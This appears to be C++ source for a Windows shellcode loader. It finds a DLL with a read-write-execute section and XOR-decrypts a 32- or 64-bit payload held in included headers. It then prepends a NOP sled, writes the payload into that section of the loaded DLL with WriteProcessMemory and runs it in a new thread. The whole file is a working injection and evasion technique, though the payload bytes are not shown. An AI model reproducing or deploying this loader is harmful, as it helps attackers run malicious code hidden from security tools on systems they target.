#include <Windows.h>
#include <Psapi.h>
#include <stdio.h>
#include <cstdint>
#include "nop.h"
#include "key.h"
#include "funx32.h"
#include "funx64.h"

//RWX Section Struct
struct RWX_SECTION_INFO
{
    long VirtualAddr;
    long VirtualSize;
};

//RWX hunting...
RWX_SECTION_INFO CheckDLLForRWX(const char* dllPath)
{
    RWX_SECTION_INFO rwxSectionInfo = { 0,0 };
    HANDLE fileHandle = CreateFile(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fileHandle == INVALID_HANDLE_VALUE)
    {
        fprintf(stderr, "Failed to open DLL: %s\n", dllPath);
        return { -1,-1 };
    }

    DWORD fileSize = GetFileSize(fileHandle, NULL);
    if (fileSize == INVALID_FILE_SIZE)
    {
        fprintf(stderr, "Failed to get file size: %s\n", dllPath);
        CloseHandle(fileHandle);
        return { -1,-1 };
    }

    HANDLE fileMapping = CreateFileMapping(fileHandle, NULL, PAGE_READONLY, 0, 0, NULL);
    if (fileMapping == NULL)
    {
        fprintf(stderr, "Failed to create file mapping: %s\n", dllPath);
        CloseHandle(fileHandle);
        return { -1,-1 };
    }

    LPVOID fileView = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, fileSize);
    if (fileView == NULL)
    {
        fprintf(stderr, "Failed to map view of file: %s\n", dllPath);
        CloseHandle(fileMapping);
        CloseHandle(fileHandle);
        return { -1,-1 };
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileView;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)fileView + dosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER optionalHeader = &(ntHeaders->OptionalHeader);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

    int hasDefaultRWXSection = 0;
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, sectionHeader++)
    {
        if (sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE &&
            sectionHeader->Characteristics & IMAGE_SCN_MEM_READ &&
            sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE)
        {
            hasDefaultRWXSection = 1;
            break;
        }
    }

    if (hasDefaultRWXSection)
    {
        #ifdef _DEBUG
            printf("Section Name: %.8s\n", sectionHeader->Name);
            printf("Virtual Size: 0x%X\n", sectionHeader->Misc.VirtualSize);
            printf("Virtual Address: 0x%X\n", sectionHeader->VirtualAddress);
            printf("Size of Raw Data: 0x%X\n", sectionHeader->SizeOfRawData);
            printf("Characteristics: 0x%X\n", sectionHeader->Characteristics);
            printf("---------------------------\n");
        #endif
        rwxSectionInfo = {(long)(sectionHeader->VirtualAddress), (long)(sectionHeader->Misc.VirtualSize) };   
    }
    UnmapViewOfFile(fileView);
    CloseHandle(fileMapping);
    CloseHandle(fileHandle);
    return rwxSectionInfo;
}

//Arch detection of binary 
typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);

LPFN_ISWOW64PROCESS fnIsWow64Process;

BOOL IsWow64(HANDLE hProc)
{
    BOOL bIsWow64 = FALSE;

    //IsWow64Process is not available on all supported versions of Windows.
    //Use GetModuleHandle to get a handle to the DLL that contains the function
    //and GetProcAddress to get a pointer to the function if available.

    fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
        GetModuleHandle(TEXT("kernel32")), "IsWow64Process");

    if (NULL != fnIsWow64Process)
    {
        if (!fnIsWow64Process(hProc, &bIsWow64))
        {
            //handle error
        }
    }
    return bIsWow64;
}

int main(int argc, char* argv[])
{
    if (argc != 2)
    {
        printf("Usage: %s [DLL Path]\n", argv[0]);
        return 1;
    }

    HANDLE hProcess = GetCurrentProcess();
   
    //max shellcode is 1024 at the moment
    char code[1024] = {}; //final code hold
    char shc[1024] = {};
    int clen = 0;

    if (IsWow64(hProcess))
    {
        #ifdef _DEBUG
            printf("[!] Using 32-bit payload\n");
        #endif

        clen = sizeof(fun32);
        memcpy(shc, fun32, clen);
    }
    else
    {
        #ifdef _DEBUG
            printf("[!] Using 64-bit payload\n");
        #endif

        clen = sizeof(fun64);
        memcpy(shc, fun64, clen);
    }

#ifdef _DEBUG
    printf("[!] Size of key: %d\n", (sizeof(keyy) / sizeof(keyy[0])));
#endif

    for (int j = 0; j < clen - 1; j++)
    {

        int outputt[] = { (int)shc[j] ^ (int)keyy[j % (sizeof(keyy)/sizeof(keyy[0]))] };
        memcpy(code + j, outputt, 1);
    }
    memcpy(nopsled, code, clen); //this give a 1024 byte nopsled in front of shellcode
    #ifdef _DEBUG  
        printf("[!] Shc decrypted %d bytes!\n", clen);
    #endif

    RWX_SECTION_INFO rwxSectInfo = CheckDLLForRWX(argv[1]);//this could probably be converted into a ptr
    if (rwxSectInfo.VirtualAddr < 1)
    {
        printf("[-] RWX Section was not detected in %s\n", argv[1]);
        return 1;
    }

    if (rwxSectInfo.VirtualSize < sizeof(nopsled))
    {
        printf("[-] RWX Section size detected (0x%x) is not large enough to hold payload (0x%x)!\n", rwxSectInfo.VirtualSize, sizeof(nopsled));
        return 1;
    }

    long RWX_SECTION_OFFSET = rwxSectInfo.VirtualAddr;

    // Load the vulnerable DLL
    HMODULE hDll = ::LoadLibrary(TEXT(argv[1]));

    if (hDll == nullptr) {
        // fail
    }

    MODULEINFO moduleInfo;
    if (!::GetModuleInformation(
        ::GetCurrentProcess(),
        hDll,
        &moduleInfo,
        sizeof(MODULEINFO))
        ) {
        // fail
    }

    //if (!DebugActiveProcess(GetCurrentProcessId())) {
    //    printf("[x] DebugActiveProcess failed with status 0x%x\n",
    //        ::GetLastError());
    //    ::CloseHandle(hProcess);
    //    return -1;
    //}

    // Access the default RWX section (Vulnerable DLL address + offset)
    LPVOID rwxSectionAddr = (LPVOID)((PBYTE)moduleInfo.lpBaseOfDll + RWX_SECTION_OFFSET );
    printf("[!] RWX Section Addr calculated as: %16llx\n", rwxSectionAddr);

    SIZE_T bytesWritten = 0;

    // Write the injected code to the RWX section
    if (!WriteProcessMemory(hProcess, rwxSectionAddr, nopsled,
        2048, &bytesWritten)) {
        printf("[x] WriteProcessMemory failed with status 0x%x\n",
            ::GetLastError());
        return -1;
    }
    ZeroMemory(&nopsled, 2048);
    
    HANDLE th;

    // run payload
    #ifdef _DEBUG
        printf("[!] Executing shellcode");
    #endif

    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)rwxSectionAddr, 0, 0, 0);
    WaitForSingleObject(th, -1);
}

